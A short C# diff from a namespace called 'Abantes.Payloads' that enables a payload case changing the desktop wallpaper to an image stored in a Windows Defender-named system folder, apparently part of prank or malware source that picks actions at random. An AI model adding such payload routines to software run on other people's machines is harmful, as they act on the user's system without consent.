@@ -40,8 +40,8 @@ namespace Abantes.Payloads
                         }
                         break;
                     case 3:
-                        //string extractPath = @"C:\Windows\Defender";
-                        //Wallpaper.Set(new Uri(extractPath + @"\wallpaper.jpg"), Wallpaper.Style.Stretched);
+                        string extractPath = @"C:\Windows\Defender";
+                        Wallpaper.Set(new Uri(extractPath + @"\wallpaper.jpg"), Wallpaper.Style.Stretched);
                         break;
                     case 4:
                         if (_random.Next(100) > 50)
